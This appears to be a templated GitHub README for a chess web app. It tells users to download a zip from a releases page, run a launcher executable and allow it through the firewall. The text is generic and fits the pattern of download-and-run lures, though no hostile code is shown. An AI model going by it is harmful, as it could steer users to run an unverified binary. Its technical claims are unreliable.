# ♟️ chess-api-dotnet-react - Play chess using modern web tools

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Endothermic-rock199/chess-api-dotnet-react/releases)

This application provides a platform for playing chess. It combines a robust backend for game logic with a visual interface for moves. The system tracks match progress and manages player sessions through secure accounts. It uses advanced machine learning concepts to help analyze board positions.

## ⚙️ System Requirements

Your computer needs specific software to run this application. Check for these components before you start:

- Windows 10 or Windows 11.
- A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
- At least 4 gigabytes of memory.
- A stable internet connection for the web services.
- The latest version of the .NET Runtime installed on your machine.

If you lack the .NET Runtime, visit the official Microsoft website to download the installer. Follow the prompts on the screen to complete the setup. This runtime allows your computer to understand the code that powers the chess application.

## 💾 How to Download

You can get the software from the release page.

[Download the application here](https://github.com/Endothermic-rock199/chess-api-dotnet-react/releases)

Follow these steps to ensure a correct installation:

1. Click the link above to view available versions.
2. Select the file ending in .zip for Windows.
3. Save the folder to a location you can find, like your Desktop or Downloads folder.
4. Right-click the folder and select Extract All.
5. Choose a destination folder and click Extract.

## 🚀 Setting Up the Application

Once you extract the files, locate the executable file. This file usually has the chess icon.

1. Open the extracted folder.
2. Double-click the file named chess-api-launcher.
3. A small status window will appear. This window tells you the application is preparing the database and the web server.
4. Keep the status window open while you play. Closing this window stops the game service.
5. Your default web browser will open automatically to show the game board.

If the browser does not open within a minute, type http://localhost:5000 into the address bar of your browser and press Enter.

## 🔐 Creating an Account

The application uses an authentication system to save your match history. When you first load the page, you see a login screen.

1. Click the Register button to create a new profile.
2. Enter a username and a password.
3. The system stores your data securely using industry-standard encryption practices.
4. After you register, return to the login screen and enter your new credentials.

## ♟️ Playing a Game

The interface shows a standard chessboard. 

- Use your mouse to click a piece.
- The board highlights valid moves for that piece.
- Click the square where you want to place the piece.
- The application updates the board state for both players in real-time using socket technology.

If you play against the computer, the machine learning module analyzes the board after each turn. It calculates the best move based on historical data. You can see these suggestions in the analysis panel on the right side of the screen.

## 🔧 Managing Settings

You can adjust your experience in the settings menu.

- Themes: Change the colors of the pieces and the board squares.
- Audio: Toggle the sound effects for piece movement and checkmate alerts.
- Difficulty: Select the skill level of the computer opponent.
- Language: Choose your preferred display language for the interface.

## 🛡️ Troubleshooting

If you encounter issues, try these steps:

- Restart the application: Close the status window and open it again.
- Clear browser cache: If the board does not update, refresh the page using the F5 key.
- Check firewall settings: Windows may ask for permission to let the application communicate with the network. Click Allow if you see this prompt.
- Update your browser: Ensure your browser is up to date to prevent display errors with the interface.

## 📈 About the Technology

This project utilizes specific software stacks to ensure speed and reliability.

- ASP.NET Core: Powers the server-side logic and handles requests.
- React: Manages the visual elements you see in the browser.
- PostgreSQL: Stores your match data and user profile information in a database.
- ML.NET: Provides the underlying patterns for board analysis and machine learning calculations.
- Socket.IO: Enables immediate updates between your browser and the server so you see moves instantly.
- Swagger: Allows developers to view technical documentation about how the pieces of the system communicate.
- Bootstrap: Keeps the layout consistent and responsive regardless of your display size.

The application architecture follows standard REST API principles. This keeps the backend server separated from the frontend visuals, which improves stability and performance.